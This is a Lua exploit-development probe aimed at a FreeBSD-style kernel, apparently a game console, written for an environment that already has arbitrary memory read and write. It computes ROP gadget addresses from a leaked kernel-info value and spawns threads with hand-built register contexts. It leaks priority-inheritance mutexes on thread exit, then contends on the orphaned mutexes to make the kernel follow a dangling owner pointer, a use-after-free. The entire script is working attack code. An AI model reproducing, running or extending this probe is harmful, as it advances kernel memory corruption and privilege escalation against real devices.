-- CRASH_CLASS: HIGH
-- PROBE 99e: Contend on orphaned PI mutex (simplified — no mass recycle)
--
-- 99d confirmed: umtx_pi leaked on thread exit, reusable via clear+lock.
-- This probe tests contention on orphaned PI mutexes to trigger kernel
-- access to the dangling pi_owner pointer.
-- (A) Leak 16 PI mutexes (2 batches × 8 children)
-- (B) Light recycle: 3 batches × 8 = 24 threads (within safe limits)
-- (C) Contend on orphaned mutex: clear owner, child A locks (fast path),
--     children B/C contend (kernel follows pi_owner → dead/recycled td)
-- (D) Direct contend: dead owner in place, contenders hit kernel

print("=== PROBE 99e: PI CONTEND ORPHANED (v2) ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- 14 slots: 0-7 for leak/recycle, 8-13 for contention
local SLOTS=14
local STK_PG=2; local PG_PER=STK_PG+1
local TOTAL_PG=4+SLOTS*PG_PER
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl5=R+0x20; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl20=R+0x40; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local sl50=R+0x60; wq(sl50,uint64(0)); wq(sl50+8,uint64(50000000))
local tb=R+0x80

local MTX_BASE=R+0x4000
local EXIT_BASE=R+0x8000

local function child_stk(i) return R+0x4000*(4+i*PG_PER) end
local function child_ctx(i) return R+0x4000*(4+i*PG_PER+STK_PG) end
local function pi_addr(i) return MTX_BASE+i*32 end
local function ex_addr(i) return EXIT_BASE+i*8 end

local function setup_ctx(slot, rax, rdi, rsi, rdx, r10, r8)
    local ctx=child_ctx(slot)
    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(child_stk(slot)))
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi))
    wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx or 0))
    wq(ctx+_R10,uint64(r10 or 0))
    wq(ctx+_R8,uint64(r8 or 0))
end

local function spawn(slot, stk_chain)
    local stk=child_stk(slot)
    local off=0
    for _,v in ipairs(stk_chain) do
        wq(stk+off, v); off=off+8
    end
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx), uint64(tb), uint64(0)) end)
    return rq(tb)
end

-- Fixed spawn: pass ctx address properly
local function spawn_child(slot, stk_chain)
    local stk=child_stk(slot)
    local ctx=child_ctx(slot)
    local off=0
    for _,v in ipairs(stk_chain) do
        wq(stk+off, v); off=off+8
    end
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx), uint64(tb), uint64(0)) end)
    return rq(tb)
end

print(string.format("region=0x%X slots=%d", R, SLOTS))

-- ============================================================
print("")
print("--- A: LEAK 16 PI objects (2 batches) ---")
-- ============================================================

local LEAK_PER=8
local total_leaked=0
local vm_a_start=vmc()

for batch=1,2 do
    for s=0,LEAK_PER-1 do
        local idx=(batch-1)*LEAK_PER+s
        local ma=pi_addr(idx)
        z(ma,32); wd(ma,0); wd(ma+4,4) -- PRIO_INHERIT
        local ea=ex_addr(idx)
        wq(ea,uint64(0))

        -- Child: LOCK(pi_mtx) → write exit_state=1 → thr_exit(0)
        setup_ctx(s, 454, ma, 5, 0, 0, 0)
        spawn_child(s, {
            PRDI, uint64(ea),
            PRAX, uint64(431), SA,
            PRDI, uint64(ts999), PRSI, uint64(0),
            PRAX, uint64(240), SA
        })
    end
    -- Wait for children to lock + exit
    native.fcall_with_rax(stub,240,sl50,0) -- 50ms

    local exits=0
    for s=0,LEAK_PER-1 do
        local idx=(batch-1)*LEAK_PER+s
        if (rd(ex_addr(idx)) or 0)==1 then exits=exits+1 end
        if (rd(pi_addr(idx)) or 0)~=0 then total_leaked=total_leaked+1 end
    end
    print(string.format("  batch %d: exits=%d leaked=%d vm=%d",
        batch, exits, total_leaked, vmc()-vm_a_start))
end

-- Save leaked TIDs
local leaked_tids={}
for i=0,15 do leaked_tids[i]=rd(pi_addr(i)) or 0 end
print(string.format("A: %d leaked, vm=%d", total_leaked, vmc()-vm_a_start))
print(string.format("  TIDs: 0x%X 0x%X 0x%X 0x%X",
    leaked_tids[0], leaked_tids[1], leaked_tids[2], leaked_tids[3]))

-- ============================================================
print("")
print("--- B: LIGHT RECYCLE (24 threads) ---")
-- ============================================================

local vm_b_start=vmc()
for batch=1,3 do
    for s=0,LEAK_PER-1 do
        setup_ctx(s, 240, sl5, 0, 0, 0, 0)
        spawn_child(s, {
            PRDI, uint64(0), PRAX, uint64(431), SA,
            PRDI, uint64(ts999), PRSI, uint64(0),
            PRAX, uint64(240), SA
        })
    end
    native.fcall_with_rax(stub,240,sl50,0)
    print(string.format("  recycle %d: canary=%s vm=%d",
        batch, N(native.fcall_with_rax(stub,20))==pid and "OK" or "FAIL",
        vmc()-vm_b_start))
end

-- ============================================================
print("")
print("--- C: CONTEND (clear owner, fast lock + contenders) ---")
-- For each test mutex:
-- 1. Clear m_owner → 0
-- 2. Slot 8: child A LOCKs (fast path, uncontested → hold via nanosleep)
-- 3. Slot 9: child B LOCKs (CONTENDED → enters kernel)
--    Kernel finds orphaned umtx_pi → pi_owner=dead td
-- 4. Wait 50ms, check state
-- ============================================================

for test=0,3 do
    local ma=pi_addr(test)
    local old_owner=rd(ma) or 0
    wd(ma, 0)  -- clear owner

    local vm_before=vmc()

    -- Child A: LOCK → nanosleep(999s)
    setup_ctx(8, 454, ma, 5, 0, 0, 0)
    spawn_child(8, {
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })
    native.fcall_with_rax(stub,240,sl20,0) -- 20ms for A to lock

    local owner_a=rd(ma) or 0

    -- Child B: LOCK (contended) → UNLOCK → nanosleep(999s)
    setup_ctx(9, 454, ma, 5, 0, 0, 0)
    spawn_child(9, {
        PRSI, uint64(6), PRAX, uint64(454), SA,  -- UNLOCK
        PRDI, uint64(ts999), PRSI, uint64(0),
        PRAX, uint64(240), SA
    })
    native.fcall_with_rax(stub,240,sl50,0) -- 50ms

    local vm_after=vmc()
    local owner_now=rd(ma) or 0
    local c=N(native.fcall_with_rax(stub,20))

    print(string.format("C[%d]: old=0x%X a=0x%X now=0x%X vmd=%d pid=%d%s",
        test, old_owner, owner_a, owner_now, vm_after-vm_before, c,
        c~=pid and " !!CANARY" or ""))

    -- Cleanup: force-clear + WAKE to unblock threads
    wd(ma, 0)
    pcall(function()
        sc_umtx(uint64(ma),uint64(3),uint64(0x7FFFFFFF),uint64(0),uint64(0))
    end)
    native.fcall_with_rax(stub,240,sl20,0)
end

-- ============================================================
print("")
print("--- D: DIRECT CONTEND (dead owner in place) ---")
-- Don't clear owner. Contenders hit kernel with dead TID.
-- Kernel does umtx_pi_lookup → finds orphaned object → follows pi_owner
-- ============================================================

for test=0,3 do
    local idx=8+test  -- use latter half of leaked mutexes
    local ma=pi_addr(idx)
    local dead_owner=rd(ma) or 0

    if dead_owner==0 then
        print(string.format("D[%d]: owner=0, skip", test))
    else
        local vm_before=vmc()

        -- Slot 10: contender on dead-owner mutex
        setup_ctx(10, 454, ma, 5, 0, 0, 0)
        spawn_child(10, {
            PRSI, uint64(6), PRAX, uint64(454), SA,
            PRDI, uint64(ts999), PRSI, uint64(0),
            PRAX, uint64(240), SA
        })
        native.fcall_with_rax(stub,240,sl50,0)

        local vm_after=vmc()
        local owner_now=rd(ma) or 0
        local c=N(native.fcall_with_rax(stub,20))

        local contested="no"
        if owner_now >= 0x80000000 then contested="YES" end

        print(string.format("D[%d]: dead=0x%X now=0x%X contested=%s vmd=%d pid=%d%s",
            test, dead_owner, owner_now, contested, vm_after-vm_before, c,
            c~=pid and " !!CANARY" or ""))
    end
end

-- ============================================================
print("")
print("--- E: CONTEND BOTH SIDES (two children, one orphaned mutex) ---")
-- Thread A: LOCK orphaned mutex (dead owner → A blocks in kernel)
-- Thread B: simultaneously LOCK same mutex (A and B both contend)
-- Maximum kernel PI chain traversal on stale pi_owner
-- ============================================================

for test=0,1 do
    local idx=12+test
    local ma=pi_addr(idx)
    local dead_owner=rd(ma) or 0

    if dead_owner==0 then
        print(string.format("E[%d]: owner=0, skip", test))
    else
        local vm_before=vmc()

        -- Both children try to LOCK simultaneously
        setup_ctx(11, 454, ma, 5, 0, 0, 0)
        setup_ctx(12, 454, ma, 5, 0, 0, 0)
        spawn_child(11, {
            PRSI, uint64(6), PRAX, uint64(454), SA,
            PRDI, uint64(ts999), PRSI, uint64(0),
            PRAX, uint64(240), SA
        })
        spawn_child(12, {
            PRSI, uint64(6), PRAX, uint64(454), SA,
            PRDI, uint64(ts999), PRSI, uint64(0),
            PRAX, uint64(240), SA
        })
        native.fcall_with_rax(stub,240,sl50,0)

        local vm_after=vmc()
        local owner_now=rd(ma) or 0
        local c=N(native.fcall_with_rax(stub,20))

        local contested="no"
        if owner_now >= 0x80000000 then contested="YES" end

        print(string.format("E[%d]: dead=0x%X now=0x%X contested=%s vmd=%d pid=%d%s",
            test, dead_owner, owner_now, contested, vm_after-vm_before, c,
            c~=pid and " !!CANARY" or ""))
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s leaked=%d", fc==pid and "OK" or "!!FAIL="..fc, total_leaked))
print("=== 99e COMPLETE ===")
